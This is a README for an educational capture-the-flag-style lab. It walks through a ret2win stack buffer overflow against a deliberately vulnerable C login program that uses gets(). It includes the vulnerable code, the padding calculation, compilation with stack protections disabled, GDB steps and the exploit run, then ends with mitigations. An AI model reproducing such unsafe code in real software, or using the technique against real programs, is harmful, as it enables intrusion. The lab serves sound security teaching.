# Control Flow Hijacking (Ret2Win Buffer Overflow)

## Project Overview
This hands-on lab demonstrates a classic **Control Flow Hijacking** attack (commonly known as *Ret2Win*). It illustrates how missing bounds-checking on user input allows an attacker to overwrite the **Saved Return Pointer (RIP)** on the stack, redirecting the program's execution flow to an uncalled target function (`success()`) without needing to execute custom shellcode.

---

## Vulnerability Analysis

### Vulnerable Code
The program allocates a 64-byte character buffer (`char buffer[64]`) and uses the deprecated, unsafe function `gets()`:

```c
void login() {
    char buffer[64];

    printf("Enter password: ");
    gets(buffer); // Vulnerability: no boundary check on input length

    printf("Access Denied.\n");
}
```

### Memory Layout in the Stack
When `login()` executes, local variables and frame control information are allocated on the Stack. Because the stack grows toward lower memory addresses, writing past `buffer[64]` moves toward higher memory addresses, eventually overwriting the Saved Frame Pointer (`RBP`) and Saved Return Address (`RIP`):

```text
[ Lower Memory Addresses (RSP) ]
+-----------------------------------+
|  buffer[64]                       |  <- Start of gets() writing
|  (64 bytes)                       |
+-----------------------------------+
|  Saved RBP (8 bytes)              |  <- Frame Pointer Overwrite
+-----------------------------------+
|  Saved RIP (8 bytes)              |  <- Target Return Address Overwrite
+-----------------------------------+
[ Higher Memory Addresses ]
```

To reach and overwrite `RIP`:
- **Padding:** 64 bytes (buffer) + 8 bytes (Saved RBP) = **72 bytes total**.
- **Payload:** 72 bytes of padding + 8-byte target address of `success()` in **Little-Endian** format.

---

## Requirements & Compilation

### Requirements
- Linux Operating System (e.g., Ubuntu / Debian)
- `gcc` Compiler
- GNU Debugger (`gdb`)
- Python 3

### Compilation
To reproduce the vulnerability predictably, compile the binary disabling stack protections (`-fno-stack-protector`), disabling Position Independent Executable (`-no-pie`) to keep memory addresses static, and including debug symbols (`-g`):

```bash
gcc -g -fno-stack-protector -no-pie overflow1.c -o overflow1
```

> **Note**: The compiler will issue a warning regarding the unsafe `gets()` function.

---

## Dynamic Analysis with GDB

### 1. Launch & Find Target Function Address
Start the debugger and locate the exact entry point address of the `success()` function, for example 0x401166:

```text
gdb ./overflow1
(gdb) print success
$1 = {void (void)} 0x401166 <success>
```

### 2. Inspecting Stack Execution
Set a breakpoint at `login` to inspect memory and verify stack layout before running the exploit:

```text
(gdb) break login
(gdb) run
(gdb) x/20gx $rsp
```

---

## Attack Reproduction (Exploit)

### Generating the Payload
Update `exploit.py` with the address of `success()` found in GDB and run the script:

```bash
python3 exploit.py
```

### Executing the Attack
Redirect `attack.txt` into the vulnerable application:

```bash
./overflow1 < attack.txt
```

### Output
```text
=== Secure Login System v1.0 ===
Enter password: Access Denied.
CONGRATULATIONS! You successfully hijacked the control flow!
Flag: flag{ret2win_success_achieved}
```

The saved return pointer (`RIP`) was successfully overwritten, hijacking execution flow and calling `success()`.

---

## Mitigations & Secure Coding

1. **Replace `gets()`**: Use boundary-checked functions such as `fgets()`:
   ```c
   fgets(buffer, sizeof(buffer), stdin);
   ```
2. **Enable Stack Canaries**: Compile without `-fno-stack-protector` so the compiler places a canary value before the frame pointer. If modified, the process terminates before executing arbitrary code.
3. **ASLR and DEP/NX**: Ensure Address Space Layout Randomization (ASLR) and Position Independent Executable (PIE) are enabled to randomize memory addresses at runtime, invalidating hardcoded target addresses.